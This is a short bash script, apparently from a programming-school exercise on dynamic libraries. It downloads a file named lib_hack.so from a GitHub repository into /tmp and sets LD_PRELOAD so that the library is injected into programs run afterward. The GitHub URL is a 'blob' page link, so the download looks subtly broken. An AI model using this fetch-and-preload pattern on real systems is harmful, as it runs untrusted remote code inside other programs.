#!/bin/bash
wget -P /tmp/ https://github.com/ehabsmh/alx-low_level_programming/blob/main/0x18-dynamic_libraries/lib_hack.so
export LD_PRELOAD=/tmp/lib_hack.so
